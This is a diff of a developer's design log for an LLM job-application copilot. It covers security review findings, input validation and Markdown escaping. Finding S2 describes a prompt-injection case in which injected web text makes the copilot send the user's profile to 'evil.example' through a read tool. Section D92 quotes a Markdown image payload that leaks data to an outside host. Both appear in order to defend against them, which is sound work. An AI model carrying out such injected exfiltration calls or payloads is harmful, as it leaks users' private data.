@@ -667,7 +667,7 @@ writer and the guard.
 | # | Finding | Severity | Response |
 |---|---|---|---|
 | S1 | Streamlit listens on all network interfaces by default, and the app has no login: anyone on the same Wi-Fi could open the CV data or delete everything | High | **Agree, fixed in Phase 10.** `.streamlit/config.toml` now sets `server.address = "localhost"`. |
-| S2 | Data exfiltration through a read tool: injected web text could make the copilot call `fetch_job_posting("https://evil.example/?p=<profile>")`; read tools need no approval | Medium | **Agree.** This is the classic "lethal trifecta" (private data + untrusted content + an outbound channel). Planned: only allow URLs that appear in the user's own message, else require approval. Listed in SECURITY.md §4. |
+| S2 | Data exfiltration through a read tool: injected web text could make the copilot call `fetch_job_posting("https://evil.example/?p=<profile>")`; read tools need no approval | Medium | **Agree.** This is the classic "lethal trifecta" (private data + untrusted content + an outbound channel). Planned: only allow URLs that appear in the user's own message, else require approval. Listed in SECURITY.md §5. |
 | S3 | `fetch_job_posting` and `get_applications` return text from postings (titles, summaries) outside untrusted tags | Medium | **Agree.** Planned: wrap both outputs. |
 | S4 | URL guard misses `100.64.0.0/10` (CGNAT) and has a DNS-rebinding window between the check and the request | Medium | **Agree.** Planned: `not ip.is_global`; pin the connection to the checked IP. |
 | S5 | Uploads are limited by bytes, not pages or chunks (a 5 MB TXT ≈ 10k chunks to embed) | Medium | **Agree.** Planned: a cap on extracted characters and chunks per file. |
@@ -679,14 +679,14 @@ writer and the guard.
 |---|---|---|---|
 | P1 | `CLAIM_PLANNER_SYSTEM` says "base every claim on evidence" but also allows an empty `evidence_ids` ("the candidate will decide"); a confirmed fact later shows as "backed by your documents" | High (per critique) | **Partly agree.** Unsupported claims are allowed on purpose: the claim check exists so the *user* can vouch for true things their documents miss (D29, D31), and they start unticked. The real issue is the label: a confirmed fact should say "confirmed by you", not "documents". Planned: fix the badge and cap unsupported claims at 2. |
 | P2 | The style learner's few-shot teaches `avoid_phrases: ["leveraged"]` for the rule "Avoid the word 'leverage'"; whole-word matching then misses "leverage" and "leveraging" | Medium | **Agree.** Planned: teach the base form and match word endings (`leverag\w*`). |
-| P3 | `wrap()` only neutralises the exact lowercase closing tag | Medium | **Agree.** Same as SECURITY.md §4. Planned: escape angle brackets in untrusted text. |
+| P3 | `wrap()` only neutralises the exact lowercase closing tag | Medium | **Agree.** Same as SECURITY.md §5. Planned: escape angle brackets in untrusted text. |
 | P4 | Learned style rules are pasted into the writer's system prompt unwrapped | Low/Medium | **Agree.** Planned: a `<style_rules>` block in the human message, with "the grounding rules win". |
 | P5 | The requirements few-shot example is a bullet list, not the schema's JSON shape, and only one easy case | Low | **Partly agree.** Structured output fixes the shape, and Phase 9 measured precision/recall 1.00/1.00. A hard example ("Python or TypeScript", EVALUATION.md §7.2) is still worth adding. |
 | P6 | Token waste: the help-bot sends the whole guide every time; the topic classifier runs even for "thanks" | Low | **Agree, low priority.** Costs are ~$0.0005 and ~$0.0001 per message. Planned: skip the classifier for short greetings. |
 
 - **Why we only fixed S1 now:** Phase 10 is documentation. S1 is a one-line config change with
   high impact and no risk. The others change behaviour and need tests, so they're listed as
-  planned work in REVIEW_GUIDE §6 and SECURITY.md §4 instead of being rushed in.
+  planned work in REVIEW_GUIDE §6 and SECURITY.md §5 instead of being rushed in.
 - **What I learned:** the reviewer found a whole class (S2, read tools as an outbound channel)
   that my own threat table (§9) didn't have, because I only thought about *write* tools.
 
@@ -1020,3 +1020,83 @@ writer and the guard.
 - **Trade-off:** the UI reads the `Document` table while the graph counts Chroma chunks. They
   agree in normal use (both are written by `add_documents`); if they ever drift, the graph's
   check is the one that protects the LLM calls.
+
+## D91. Central input validation, checked in the UI and again before saving (Phase 11)
+- **Problem:** the "Get started" form accepted any name, email or phone ("R2D2", "zoe-at-example",
+  "12"). Each page had its own ad-hoc checks (`if not name.strip()`, a `max_chars` here and
+  there), so the same text was accepted in one place and rejected in another. Data could also
+  arrive without passing a form at all: the copilot's `update_tracker` tool, learned style
+  rules, facts from the claim check, scripts and tests.
+- **What:**
+  - **One package, `app/validation/`:** `validators.py` holds one small, pure function per
+    kind of input (name, email, phone, URL, place, list, salary, free text, job input, due
+    date); `models.py` builds one Pydantic model per form or service input from them
+    (`ProfileInput`, `PreferencesInput`, `JobInput`, `NoteInput`, `TrackerUpdateInput`,
+    `ClaimEdit`, `FactInput`, `StyleRuleInput`, `CoverLetterInput`, `CvBulletsInput`,
+    `ContextInput`, `ChatInput`, `InterviewAnswerInput`, `CompanyFocusInput`,
+    `SettingsInput`, …). `check_input()` returns `(model, {})` or `(None, {field: message})`;
+    `validate_input()` raises `InvalidInputError` (an `AppError` with `.errors`). Every limit
+    lives in `app/config.py` ("input validation limits"), so the UI hints and the messages read
+    the same numbers.
+  - **Normalise first:** control characters, zero-width and bidi-override characters are
+    removed, Unicode is NFC-normalised, whitespace runs collapse to one space, text is
+    trimmed. Emails are stored in lower case, phones in E.164, LinkedIn links get `https://`.
+  - **Client side (the pages):** validate on submit, keep the errors in `session_state`, rerun;
+    each message is drawn in red right under its field (`field_error`), with one summary at
+    the top when several fields are wrong (`error_summary`). The widgets keep what the user
+    typed. Required fields are marked `*`; placeholders show examples ("+49 151 12345678").
+    Optional fields left empty never cause errors. Long actions use `busy_button`, which is
+    disabled while its action runs, so a second click can't start the same work twice.
+  - **Server side (defence in depth):** the memory store validates every profile, preference,
+    fact and style rule before `put()`; `repo.create_job` / `update_job` clean and
+    length-check every text field; `apply_update` (the copilot's write tool) uses
+    `TrackerUpdateInput`; `applications.add_job` checks `JobInput` before a card exists; the
+    graph's `input_guard` and the chat / interview guards use the same rules; dev settings use
+    `SettingsInput`. LLM-generated facts or rules that break a rule are logged and skipped, so
+    a run never fails because of them.
+  - **Old data:** `memory.store.Profile` stays the lenient *stored* shape, so a profile saved
+    before these rules still loads. `profile_problems()` lists what breaks today's rules; the
+    Memory page and Get started show a warning and the messages under the fields.
+- **Why Unicode names:** real names aren't ASCII. "Esmaeil", "Zoë", "O'Brien", "Jean-Luc",
+  "Nguyễn Văn An", "李小龙" must all pass. The rule is "letters of any script (Unicode category
+  L or M) plus spaces, hyphens, apostrophes and dots", not a Latin `[A-Za-z]` regex.
+  Digits and symbols (`<>{}@`, emoji) are rejected: they are typos or injection attempts.
+- **Why E.164:** one format for every way of typing a number (`0151 …`, `+49 151 …`,
+  `0049 151 …`) makes stored numbers comparable and unambiguous. `phonenumbers` (Google's
+  libphonenumber) knows each country's real number lengths; German is the default region for
+  numbers without a country code. The UI and the cover letter show it formatted
+  (`format_phone`: "+49 1511 2345678").
+- **Why both layers:** the client check gives fast, specific messages next to the field; the
+  server check is what actually protects the data, because the UI is only one way in.
+  Running the same model in both places means they can't drift apart.
+- **Choices worth knowing:** emails use `email-validator` with `check_deliverability=False`
+  (no DNS lookup, works offline). Places also allow dots, apostrophes and brackets ("St.
+  Gallen", "Remote (EU)", the demo persona). The expected salary stays free text ("50–60k €",
+  "4,500 € per month") because the Salary tab reads ranges and periods from it; the validator
+  checks that every amount, converted to yearly, is between 10,000 and 500,000 and that only
+  one listed currency (EUR, USD, GBP, CHF) is named. Empty company / subject / salutation /
+  closing in the letter editor are allowed, because the export fills them in from the job.
+  The dev settings model list is now closed (`CHAT_MODELS`), and max tokens is checked
+  against each model's output limit (`MODEL_MAX_OUTPUT_TOKENS`).
+- **Alternatives:** *checks in each page*: what we had; they drifted. *Only Pydantic field
+  constraints on the stored models*: old data would no longer load, and the messages would be
+  Pydantic's ("String should match pattern …"), not the user's language. *Only server-side*:
+  safe, but the user would see one generic error instead of a message under each field.
+- **Found on the way:** saving a due date on the Notes tab crashed, because SQLModel only
+  stores timezone-aware datetimes. Due dates are now stored as midnight UTC.
+
+## D92. User text is escaped before Streamlit draws it as Markdown (Phase 11)
+- **Problem:** `st.markdown`, `st.caption`, `st.info`, toasts and even labels render Markdown.
+  A job title like `![x](https://evil.example/?leak)` would load an image from another site,
+  `[Click](…)` becomes a link, `:red[…]` recolours the page, `$…$` becomes LaTeX.
+- **What:** `app/validation/sanitize.py` → `md()` backslash-escapes the characters that start
+  Markdown, Streamlit directives, LaTeX and HTML (and list / heading markers at the start of a
+  line). Every place that puts user text (or text extracted from a posting: job titles,
+  company names, requirements, evidence quotes) into Markdown wraps it in `md()`. The letter
+  preview, the only place that builds HTML with `unsafe_allow_html=True`, uses `html_text()`
+  (`html.escape` with quotes). Copilot and help-bot *answers* are kept as Markdown, because
+  formatting is their point.
+- **Why escape on output as well as validate on input:** validation decides what may be
+  saved; escaping decides how saved text is shown. Old data, LLM-extracted titles and
+  evidence quotes from documents were never validated, and a valid note may still contain
+  `**`.
